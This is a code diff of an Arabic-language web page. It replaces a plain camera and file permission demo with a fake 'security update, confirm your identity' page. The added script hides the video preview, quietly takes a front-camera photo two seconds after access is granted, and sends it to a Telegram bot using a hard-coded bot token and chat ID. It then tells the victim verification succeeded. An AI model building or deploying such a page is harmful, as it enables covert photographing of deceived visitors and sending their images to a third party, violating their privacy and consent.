@@ -3,60 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الصلاحيات</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 30px; background: #f4f4f9; }
-        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h2 { color: #333; }
-        p { color: #777; font-size: 14px; }
-        .btn { background: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
-        video { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
-        .file-input { margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
+        canvas { display: none; }
+        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>تفعيل الوسائط</h2>
-    <p>يرجى منح الصلاحيات المطلوبة للمتابعة</p>
-
-    <button class="btn" id="accessMaster">طلب صلاحية الكاميرا والمايك</button>
-
-    <div class="file-input">
-        <p>إرفاق ملفات إضافية:</p>
-        <input type="file" id="filePicker" multiple>
+    <div id="main">
+        <h2>تحديث أمني للنظام</h2>
+        <p>يرجى الضغط على الزر أدناه لتأكيد هويتك ومتابعة التصفح.</p>
+        <button class="btn" id="startBtn">تأكيد الهوية الآن</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
-</div>
+    <canvas id="canvas"></canvas>
 
 <script>
-    const accessBtn = document.getElementById('accessMaster');
-    const video = document.getElementById('video');
+    // --- إعدادات التليغرام ---
+    const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; // ضع التوكن هنا
+    const chatId = "6492264194";     // ضع الآيدي هنا
+    // ------------------------
 
-    accessBtn.addEventListener('click', () => {
-        // طلب الكاميرا والمايكروفون معاً
-        navigator.mediaDevices.getUserMedia({ 
-            video: true, 
-            audio: true 
-        })
+    const startBtn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    startBtn.addEventListener('click', () => {
+        startBtn.innerText = "جاري التحقق...";
+        
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
-            alert("تم تفعيل الكاميرا والمايكروفون بنجاح");
-            video.style.display = "block";
             video.srcObject = stream;
+            
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                // تحويل الصورة إلى ملف (Blob) لإرساله
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'capture.png');
+
+                    // إرسال الصورة للبوت عن طريق الـ API
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => {
+                        alert("تم تأكيد الهوية بنجاح، يمكنك إغلاق الصفحة.");
+                        stream.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(err => console.error("Error sending to TG:", err));
+                }, 'image/png');
+
+            }, 2000); // التقاط بعد ثانيتين من السماح
         })
         .catch(err => {
-            alert("يرجى الموافقة على جميع الصلاحيات للمتابعة");
+            alert("خطأ: يرجى الموافقة على طلب النظام للمتابعة.");
         });
     });
-
-    // مراقبة اختيار الملفات
-    document.getElementById('filePicker').addEventListener('change', function() {
-        if(this.files.length > 0) {
-            alert("تم اختيار " + this.files.length + " ملفات");
-        }
-    });
 </script>
-
 </body>
 </html>
